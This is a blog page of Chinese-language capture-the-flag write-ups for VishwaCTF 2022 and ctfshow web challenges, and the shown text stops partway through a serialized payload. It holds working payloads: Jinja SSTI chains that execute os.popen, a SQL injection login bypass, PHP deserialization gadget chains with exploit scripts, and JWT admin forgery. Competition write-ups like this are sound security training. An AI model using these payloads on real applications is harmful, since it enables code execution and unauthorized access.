<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">39</span></a></div></div></div><nav id="nav" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">cyxin</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/24/VishwaCTF%202022/">VishwaCTF 2022</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-24</time><div class="content"><h2 id="Hey-Buddy"><a href="#Hey-Buddy" class="headerlink" title="Hey Buddy!"></a>Hey Buddy!</h2><p>考察ssti，先利用链子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>发现<br><img src="https://img-blog.csdnimg.cn/a81cb17995234d818565aa3f335558ab.png"><br>之后再利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">99</span>](path=%<span class="number">27</span>%<span class="number">27</span>,fullname=%<span class="number">27</span>%<span class="number">27</span>).get_data(%<span class="number">27</span>./flag.txt%<span class="number">27</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/ceeefe73b21f41939348fc753332a278.png"></p>
<h2 id="My-Useless-Website"><a href="#My-Useless-Website" class="headerlink" title="My Useless Website"></a>My Useless Website</h2><p>直接万能密码<br>1’ or 1=1 – +</p>
<h2 id="Stock-Bot"><a href="#Stock-Bot" class="headerlink" title="Stock Bot"></a>Stock Bot</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/c6c5056108274cf18d9b085d94a02869.png"><br>访问后发现file_get_contents函数<br>之后猜一下flag，由于源码有Flag<br>直接包含Flag得到<br><img src="https://img-blog.csdnimg.cn/129acfa2bd864d03ae3c93e7172bb131.png"></p>
<h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/a9f07eb97ea54d82b237aac3e881524e.png"><br>访问的到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> ShowSource();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$todos</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = sha1(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>经分析（分析有点’乱‘），得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source= <span class="string">&#x27;/opt/app-root/src/flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$todos</span>[] = <span class="keyword">new</span> ShowSource();</span><br><span class="line"><span class="keyword">echo</span> sha1(serialize(<span class="variable">$todos</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$todos</span>));</span><br></pre></td></tr></table></figure>
<p>将todos放入cookie得到flag</p>
<h2 id="Strong-Encryption"><a href="#Strong-Encryption" class="headerlink" title="Strong Encryption"></a>Strong Encryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decrypt -&gt; 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$enKey</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$strHex</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$Key</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$rKey</span>=<span class="number">69</span>;</span><br><span class="line">        <span class="variable">$tmpKey</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$enKey</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$Key</span>.=ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>;</span><br><span class="line">            <span class="variable">$tmpKey</span>.=chr(ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>);</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$rKeyHex</span>=dechex(<span class="variable">$rKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$enKeyHash</span> = hash(<span class="string">&#x27;sha256&#x27;</span>,<span class="variable">$tmpKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">                <span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$strHex</span> .= dechex(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])+<span class="variable">$Key</span>[<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$encTxt</span> = <span class="variable">$strHex</span>.<span class="variable">$rKeyHex</span>.<span class="variable">$enKeyHash</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$encTxt</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encTxt</span> = encrypt(<span class="variable">$flag</span>, <span class="string">&quot;VishwaCTF&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$encTxt</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解密脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982&quot;</span>;</span><br><span class="line"><span class="variable">$Key</span>=<span class="string">&#x27;155174184173188166136153139&#x27;</span>;   </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str2</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">			<span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$str2</span>[<span class="variable">$i</span>].<span class="variable">$str2</span>[<span class="variable">$i</span>+<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$flag</span> .= chr(hexdec(<span class="variable">$a</span>)-<span class="variable">$Key</span>[<span class="variable">$j</span>]);  </span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Keep-Your-Secrets"><a href="#Keep-Your-Secrets" class="headerlink" title="Keep Your Secrets"></a>Keep Your Secrets</h2><p>进入题目，然后进行注册，发现出现jwt<br><img src="https://img-blog.csdnimg.cn/1f673019cf31480680509bc57b15e6b1.png"></p>
<p>jwt解密，并修改权限为admin<br>密码利用脚本爆破（owasp）<br>（虽然我的字典没有这个密码！！）<br>之后加入token到header中<br><img src="https://img-blog.csdnimg.cn/0b24261f6a814cba956d80f33f4b329c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h2 id="Request-Me-FLAG"><a href="#Request-Me-FLAG" class="headerlink" title="Request Me FLAG"></a>Request Me FLAG</h2><p>进入题目，看提示发现让修改请求方式<br>修改得到<br><img src="https://img-blog.csdnimg.cn/3d3f75bd75064282ac3ee875fe8c2b87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/">ctfshow 卷王杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-09</time><div class="content"><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/f106b99be0794b28b45fc1535910d65c.png" alt="在这里插入图片描述"><br>进入题目<br><img src="https://img-blog.csdnimg.cn/2cfca4ce29aa4da7bbfcc45f2b656092.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到题目想到内置类<br>利用数组溢出绕过c<br>再利用内置类得到flag<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">FilesystemIterator</span>&amp;b=/<span class="keyword">var</span>/www/html&amp;c=<span class="number">9223372036854775806</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过该函数找到文件夹<br><img src="https://img-blog.csdnimg.cn/96d34e7f7be14299bba8f790caadc5fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=<span class="number">9223372036854775806</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$fn</span>, <span class="variable">$prev</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="keyword">$this</span>-&gt;object-&gt;add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;object-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        call_user_func([<span class="keyword">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看这位师傅写的博客，比较详细<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/not_code_god/article/details/123170171?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164604602616780271936202%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164604602616780271936202&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123170171.pc_search_result_control_group&utm_term=ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF&spm=1018.2226.3001.4187">大佬博客</a><br>最后的exp为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one(),<span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> second();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> third();</span><br><span class="line"><span class="variable">$b</span>-&gt;object=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;filename=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;object=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>second%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>third%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>third%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span 